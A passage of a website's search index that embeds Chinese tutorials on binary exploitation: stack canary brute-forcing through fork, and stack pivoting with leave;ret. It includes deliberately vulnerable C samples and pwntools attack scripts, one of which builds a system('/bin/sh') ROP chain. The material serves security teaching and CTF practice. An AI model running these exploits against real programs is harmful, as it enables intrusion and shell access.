...
具体的可以自己多调试看看
`}),e.add({id:5,href:"/docs/exploit/stackoverflow/canary_blast/",title:"Canary爆破",description:`0x01 介绍 # Canary能够爆破的情况非常少，必要条件有两点：
...
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;sys/wait.h\u0026gt; void run() { char buf[0x10]; read(0, buf, 0x50); } int main() { pid_t pid; puts(\u0026quot;Canary blast\u0026quot;); while(1) { pid = fork(); if(pid \u0026gt; 0) { wait(0); // 等待子进程资源回收，即不执行父进程 } else if(pid == 0) { run(); puts(\u0026quot;done\u0026quot;); } else { break; } } return 0; } // gcc canary_blast.`,content:`0x01 介绍 # Canary能够爆破的情况非常少，必要条件有两点：
多次触发stack smash 触发了stack smash也不会退出整个程序的运行 能实现这样条件的大概只有循环+fork子进程，fork函数可以创建一个和原进程一样的进程，然后原进程和这个新建的进程会同时执行接下来的代码。fork函数返回值有三种类型，第一种为0，即当前进程是子进程，第二种是大于0，表示当前进程为父进程，第三种为小于0表示fork失败。举个例子来说
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main() { pid_t pid = fork(); // 子进程和父进程将会同时执行以下代码 if(pid == 0) { printf(\u0026quot;this is a child process\\n\u0026quot;); } else if(pid \u0026gt; 0) { printf(\u0026quot;this is a father process\\n\u0026quot;); } else { printf(\u0026quot;fork error\\n\u0026quot;); } return 0; } // gcc fork_test.c -o fork_test pid等于0的情况和大于0的情况都会被运行到，对于子进程来说fork的返回值是0，而对于父进程来说fork的返回值是大于0的，然后子进程和父进程会并行运行，两种情况都会被打印出来。
子进程和父进程哪个先被执行是由操作系统调度决定的。了解了fork是如何运行的，接下来看一个典型的题目
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;sys/wait.h\u0026gt; void run() { char buf[0x10]; read(0, buf, 0x50); } int main() { pid_t pid; puts(\u0026quot;Canary blast\u0026quot;); while(1) { pid = fork(); if(pid \u0026gt; 0) { wait(0); // 等待子进程资源回收，即不执行父进程 } else if(pid == 0) { run(); puts(\u0026quot;done\u0026quot;); } else { break; } } return 0; } // gcc canary_blast.c -o canary_blast -no-pie -fstack-protector 这个函数是满足canary爆破的两个条件的，首先fork函数创建的子进程复制了父进程的canary，两者的canary是一样的，其次fork的子进程被stack smash，也不会破坏父进程的while循环fork新子进程。
...
我们尝试爆破一个字节来试试。攻击代码为
from pwn import* context.log_level = 'debug' o = process(\u0026quot;./canary_blast\u0026quot;) canary = [0x00] for i in range(0xff): payload = b'a'*24 + p8(canary[0]) + p8(i) o.sendline(payload) res = o.recv(timeout = 1) if \u0026quot;done\u0026quot; in res.decode(): print(\u0026quot;the 7th is %02x\u0026quot; % (i)) canary.append(i) break o.interactive() 运行后可以看到canary的第7个字节为0x77，这时候我们可以gdb附加来看一下canary的值是否一样
可以看到是一样的，接下来的操作为把爆破出来的字节添加到payload里，爆破下一个字节，直到所有字节都被爆破出来为止，攻击脚本也比较简单
from pwn import* context.log_level = 'debug' o = process(\u0026quot;./canary_blast\u0026quot;) canary = [0x00] i = 0 while i \u0026lt; 7: for x in range(0xff): payload = b'a'*24 for y in canary: payload += p8(y) payload += p8(x) o.send(payload) res = o.recv(timeout = 1) if \u0026quot;done\u0026quot; in res.decode(): print(\u0026quot;the 7th is %02x\u0026quot; % (x)) canary.append(x) break i += 1 print(\u0026quot;canary is \u0026quot;, end=\u0026quot;\u0026quot;) for i in range(8): print(\u0026quot;%02x\u0026quot; % (canary[7-i]), end=\u0026quot;\u0026quot;) print() o.interactive() 接下来就是普通的ROP攻击了
`}),e.add({id:6,href:"/docs/exploit/stackoverflow/stack_pivoting/",title:"栈迁移",description:`0x01 介绍 # 很多时候由于溢出栈字节不够多，不能构造完整的payload，这时候就需要用到stack pivoting技巧来完成操作。它的核心理念在于如果我们在某个内存中可以输入完整的payload，那么我们就可以用该技巧将当前栈顶指针修改指向这段内存，然后通过一些指令来执行这段内存里的payload。
最常见的指令是leave;ret指令。leave是相对于函数序言的相反操作，函数序言的操作为
push ebp mov ebp, esp 将上一个函数栈帧的栈底指针压入到栈中，然后在将当前esp赋值给ebp即设置当前栈帧的栈底指针。leave的操作刚好相反，先将当前ebp赋值给esp，在弹出当前栈顶即恢复上一个函数栈帧的栈底指针，相当于以下指令
mov esp, ebp pop ebp 如果我们在溢出的是否覆盖了保存在栈里的上一个栈帧的栈底指针，通过leave指令就会将这个值保存到了ebp里，如果这时候再次执行leave指令，则会将ebp中保存的修改后的指针赋值给esp，也就是将当前栈顶指针迁移到了我们覆盖的地址+一个栈单元处。
加一个栈单元的原因是leave会在esp转移过去后先pop一个栈单元到ebp中。如果我们在指定的地址+一个栈单元处填了ROP链，那么迁移过去后执行ret指令就会开始执行ROP链。以一个例子来说
#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char data[0x1000] = {0};// 防止其他函数操作覆盖到got之类的数据 char p[0x20]; ​ void hint() { system(\u0026quot;echo flag\u0026quot;); } ​ void run() { char buf[0x10]; read(0, buf, 0x20); read(0, p, 0x20); } ​ int main() { run(); return 0; } // gcc stack_pivoting.c -o stack_pivoting -m32 -fno-stack-protector -no-pie 第一次输入虽然是栈溢出，但是它只能覆盖到函数返回地址，而且程序只有system函数，还需要自己构造/bin/sh字符串，第二次输入是往全局变量里写入字符串，我们可以将/bin/sh写入到里面并同时构造system(\u0026quot;/bin/sh\u0026quot;)的ROP链，它的结构可以为
/bin/sh\\x00在末尾的目的是为了防止在解析system函数实际地址的时候被覆盖掉导致无法执行 我们通过栈溢出覆盖上一个栈帧的栈底指针为这里的system@plt-4的位置，然后将函数返回地址覆盖为leave指令的地址，最后执行完两次leave后esp就迁移到了system@plt的位置，这时候再执行ret指令，就会执行system(\u0026quot;/bin/sh\u0026quot;)的ROP链了。我们可以写出攻击脚本为`,content:`0x01 介绍 # 很多时候由于溢出栈字节不够多，不能构造完整的payload，这时候就需要用到stack pivoting技巧来完成操作。它的核心理念在于如果我们在某个内存中可以输入完整的payload，那么我们就可以用该技巧将当前栈顶指针修改指向这段内存，然后通过一些指令来执行这段内存里的payload。
最常见的指令是leave;ret指令。leave是相对于函数序言的相反操作，函数序言的操作为
push ebp mov ebp, esp 将上一个函数栈帧的栈底指针压入到栈中，然后在将当前esp赋值给ebp即设置当前栈帧的栈底指针。leave的操作刚好相反，先将当前ebp赋值给esp，在弹出当前栈顶即恢复上一个函数栈帧的栈底指针，相当于以下指令
mov esp, ebp pop ebp 如果我们在溢出的是否覆盖了保存在栈里的上一个栈帧的栈底指针，通过leave指令就会将这个值保存到了ebp里，如果这时候再次执行leave指令，则会将ebp中保存的修改后的指针赋值给esp，也就是将当前栈顶指针迁移到了我们覆盖的地址+一个栈单元处。
加一个栈单元的原因是leave会在esp转移过去后先pop一个栈单元到ebp中。如果我们在指定的地址+一个栈单元处填了ROP链，那么迁移过去后执行ret指令就会开始执行ROP链。以一个例子来说
#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char data[0x1000] = {0};// 防止其他函数操作覆盖到got之类的数据 char p[0x20]; ​ void hint() { system(\u0026quot;echo flag\u0026quot;); } ​ void run() { char buf[0x10]; read(0, buf, 0x20); read(0, p, 0x20); } ​ int main() { run(); return 0; } // gcc stack_pivoting.c -o stack_pivoting -m32 -fno-stack-protector -no-pie 第一次输入虽然是栈溢出，但是它只能覆盖到函数返回地址，而且程序只有system函数，还需要自己构造/bin/sh字符串，第二次输入是往全局变量里写入字符串，我们可以将/bin/sh写入到里面并同时构造system(\u0026quot;/bin/sh\u0026quot;)的ROP链，它的结构可以为
/bin/sh\\x00在末尾的目的是为了防止在解析system函数实际地址的时候被覆盖掉导致无法执行 我们通过栈溢出覆盖上一个栈帧的栈底指针为这里的system@plt-4的位置，然后将函数返回地址覆盖为leave指令的地址，最后执行完两次leave后esp就迁移到了system@plt的位置，这时候再执行ret指令，就会执行system(\u0026quot;/bin/sh\u0026quot;)的ROP链了。我们可以写出攻击脚本为
from pwn import* context.log_level = 'debug' o = process(\u0026quot;./stack_pivoting\u0026quot;) system_plt = 0x8048310 p = 0x804b040 leave_ret = 0x8048482 payload = b'a'*0x18 + p32(p-4) + p32(leave_ret) o.send(payload) payload = p32(system_plt) + p32(p+12)*2 + b\u0026quot;/bin/sh\\x00\u0026quot; o.sendline(payload) o.interactive() 栈迁移除了可以迁移到bss，还可以迁移到很多地方，只要你有地址就可以尝试迁移，比如栈或者堆
`}),e.add({id:7,href:"/docs/exploit/formatstring/",title:"FormatString",description:"",content:""}),e.add({id:8,href:"/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",title:"格式化字符串漏洞",description:`0x01 介绍 # 格式化字符串格式 # 在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如
...
`}),e.add({id:10,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:11,href:"/docs/",title:"Docs",description:"learn docs",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()